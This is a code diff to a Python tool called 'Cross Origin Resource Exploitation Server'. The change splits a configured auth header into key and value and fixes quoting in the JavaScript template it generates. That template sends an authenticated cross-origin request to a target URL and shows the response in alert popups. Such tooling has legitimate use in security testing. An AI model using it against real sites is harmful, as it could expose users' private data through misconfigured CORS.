@@ -29,13 +29,15 @@ class Cores(object):
         self.http_server_pid = None
         self.autolaunch_browser = False
         self.headers = ''.join(headers)
+        self.header_key = self.headers.split(':')[0]
+        self.header_val = self.headers.split(':')[1]
         self.json_payload = ''.join(json_payload)
 
         print('\n******************\n\nC.O.R.E.S.: Cross Origin Resource Exploitation Server\n')
 
         print('See https://en.wikipedia.org/wiki/Cross-origin_resource_sharing\n')
 
-        print('\n\nURL : {}\n\nMETHOD : {}\n\nHEADERS : {}\n\nPAYLOAD : {}\n\n'.format(self.url, self.method, self.headers, self.json_payload))
+        print('\n\nURL : {}\n\nMETHOD : {}\n\nHEADER_KEY :{}\n\nHEADER_VAL : {}\n\nPAYLOAD : {}\n\n'.format(self.url, self.method, self.header_key, self.header_val, self.json_payload))
 
 
     def dir_check(self):
@@ -71,12 +73,12 @@ class Cores(object):
 
 //nick calls function for listener
 xhr.onload = reqListener;
-xhr.open({0},{1}, true); //passes in method and url and true
+xhr.open('{0}','{1}', true); //passes in method and url and true
 
 xhr.responseType = '';
 
-//sets bearer auth header
-xhr.setRequestHeader({2});
+//sets bearer auth header type:value are in 2 separate fields
+xhr.setRequestHeader('{2}','{3}');
 
 //set content type for POST, could prob conditionally do this
 xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');
@@ -90,7 +92,7 @@ xhr.onload = function () {{
 }};
 
 //send JSON payload
-//xhr.send(JSON.stringify({3}));
+//xhr.send(JSON.stringify({4}));
 
 //pop up alerts? bills experiments 
 window.alert(xhr.response);
@@ -100,7 +102,7 @@ document.write(xhr.responseText);
 //nick's js popup logger
 function reqListener() {{window.alert(this.responseText);}};
 """
-        cors_js = javascript_template.format(self.method, self.url, self.headers, self.json_payload)
+        cors_js = javascript_template.format(self.method, self.url, self.header_key, self.header_val, self.json_payload)
         with open(filename, 'w+') as f:
             f.write(cors_js)
             return cors_js
